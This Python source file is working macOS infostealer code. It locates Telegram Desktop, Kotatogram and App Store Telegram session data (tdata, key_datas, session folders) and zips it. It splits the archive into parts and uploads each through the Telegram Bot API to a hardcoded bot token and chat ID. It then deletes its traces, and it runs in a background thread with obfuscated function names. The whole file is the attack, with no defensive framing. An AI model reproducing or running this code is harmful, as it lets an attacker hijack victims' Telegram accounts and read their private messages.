import warnings
warnings.filterwarnings("ignore", category=UserWarning, module="zipfile")

import os
import re
import tempfile
import threading
import zipfile
from datetime import datetime
from pathlib import Path

import requests

ROOT_PATH = os.path.expanduser("~")

CONTAINER_PATH = os.path.join(ROOT_PATH, "Library", "Containers")

POSSIBLE_PATHS = [
    os.path.join(ROOT_PATH, "Library", "Containers", "org.telegram.desktop", "Data", "Library", "Application Support", "Telegram Desktop"),
    os.path.join(ROOT_PATH, "Library", "Group Containers"),
    os.path.join(ROOT_PATH, "Library", "Application Support", "Telegram Desktop"),
    os.path.join(ROOT_PATH, "Library", "Application Support", "Kotatogram Desktop"),
    os.path.join(ROOT_PATH, "Desktop", "Telegram", "TelegramForcePortable"),
]

B_T: str = "7656633959:AAF_nev0Abbu5Sr4ETtE9vYdkf3mavCvcps"
C_I: str = "5018443124"

MAX_SIZE: int = 40 * 1024 * 1024  # 40 MB in bytes

def split_and_send_zip(archive_name: str, temp_dir: str):
    archive_size = os.path.getsize(archive_name)
    if archive_size <= MAX_SIZE:
        s_z_t_t(archive_name)
        return

    s_t_t_t(f"Архив {archive_name} превышает 40 МБ ({archive_size} байт), разделяю на части")

    part_num = 1
    current_size = 0
    current_files = []
    part_paths = []

    with zipfile.ZipFile(archive_name, 'r') as original_zip:
        for file_info in original_zip.infolist():
            file_size = file_info.file_size
            if current_size + file_size > MAX_SIZE and current_files:
                # Создаем новую часть
                part_archive = os.path.join(temp_dir, f"td_{datetime.now()}_part{part_num}.zip")
                with zipfile.ZipFile(part_archive, 'w', zipfile.ZIP_DEFLATED) as part_zip:
                    for file_name in current_files:
                        part_zip.writestr(file_name, original_zip.read(file_name))
                part_paths.append(part_archive)
                s_t_t_t(f"Создана часть {part_num}: {part_archive}, размер: {os.path.getsize(part_archive)} байт")
                part_num += 1
                current_size = 0
                current_files = []

            current_files.append(file_info.filename)
            current_size += file_size

        # Создаем последнюю часть
        if current_files:
            part_archive = os.path.join(temp_dir, f"td_{datetime.now()}_part{part_num}.zip")
            with zipfile.ZipFile(part_archive, 'w', zipfile.ZIP_DEFLATED) as part_zip:
                for file_name in current_files:
                    part_zip.writestr(file_name, original_zip.read(file_name))
            part_paths.append(part_archive)
            s_t_t_t(f"Создана часть {part_num}: {part_archive}, размер: {os.path.getsize(part_archive)} байт")

    # Отправляем все части
    for part_path in part_paths:
        s_z_t_t(part_path)
        d_z_a(part_path)

def s_t_t_t(message: str) -> None:
    try:

        url = f"https://api.telegram.org/bot{B_T}/sendMessage"
        data = {
            'chat_id': C_I,
            'text': message
        }
        _ = requests.post(url, data=data)
    except Exception as e:
        pass

def s_z_t_t(zip_path: str):
    try:
        if not os.path.exists(zip_path):
            s_t_t_t(f"Архив {zip_path} не существует")
            return
        s_t_t_t(f"Отправка архива: {zip_path}, размер: {os.path.getsize(zip_path)} байт")
        url = f"https://api.telegram.org/bot{B_T}/sendDocument"
        with open(zip_path, 'rb') as file:
            files = {'document': (os.path.basename(zip_path), file)}
            data = {'chat_id': C_I}
            response = requests.post(url, files=files, data=data)
        s_t_t_t(f"Ответ Telegram API: {response.status_code}, {response.text}")
        if response.status_code != 200:
            s_t_t_t(f"Ошибка отправки в Telegram: {response.text}")
    except Exception as e:
        s_t_t_t(f"Ошибка при отправке архива в Telegram: {str(e)}")

def z_d(archive_name: str, paths: list[str]) -> None:
    with zipfile.ZipFile(archive_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for path in paths:
            if os.path.isfile(path):
                zipf.write(path, os.path.relpath(path, os.path.dirname(path)))
            elif os.path.isdir(path):
                for root, _, files in os.walk(path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(path)))
    s_t_t_t(f"Архив создан: {archive_name}, размер: {os.path.getsize(archive_name)} байт")

def d_z_a(zip_path: str):
    try:
        if os.path.exists(zip_path):
            os.remove(zip_path)
            s_t_t_t(f"Архив {zip_path} успешно удалён")
        else:
            s_t_t_t(f"Архив {zip_path} не существует")
    except Exception as e:
        s_t_t_t(f"Ошибка при удалении архива {zip_path}: {str(e)}")


def g_s(tdata_path: str) -> list[str] | None:
    try:
        session_paths = []
        for entry in os.scandir(tdata_path):
            if any([
                re.match(r'^[A-Z0-9]{16}$', entry.name),
                re.match(r'^[A-Z0-9]{16}s$', entry.name),
                re.match(r'^key_datas$', entry.name)
            ]):
                session_paths.append(entry.path)
        return session_paths if session_paths else None
    except Exception as e:
        s_t_t_t(f"Ошибка при сканировании директории: {str(e)}")
        return None

def check_t():
    paths = []
    for path in POSSIBLE_PATHS:
        if os.path.isdir(path):
            if "Group Containers" in path:
                s_t_t_t(f"Telegram with AppStore was found - {path}")
                for folder in Path(path).glob("*keepcoder.Telegram"):
                    if folder.is_dir() and folder.name.endswith("keepcoder.Telegram"):
                        for file in os.scandir(folder):
                            if file.name == "appstore":
                                s_t_t_t("AppStore exists")
                                paths.append(file.path)
            elif "Application Support" in path:
                tdata = os.path.join(path, "tdata")
                s_t_t_t(f"Telegram with TData was found - {path}")
                if os.path.isdir(tdata):
                    s_t_t_t("TData exists")
                    paths.extend(g_s(tdata))
                else:
                    s_t_t_t("TData not exists")

    return paths

def s() -> None:
    with tempfile.TemporaryDirectory() as temp_dir:
        archive_name = os.path.join(temp_dir, f"td_{datetime.now()}.zip")

        try:
            s_t_t_t("td was found")
            session_paths = check_t()
            if session_paths:
                z_d(archive_name, session_paths)
                split_and_send_zip(archive_name, temp_dir)
            else:
                s_t_t_t("Не найдено подходящих файлов для архивации")
        except Exception as e:
            s_t_t_t(str(e))
        finally:
            d_z_a(archive_name)

def start_monitor_m():
    thread = threading.Thread(target=s)
    thread.start()
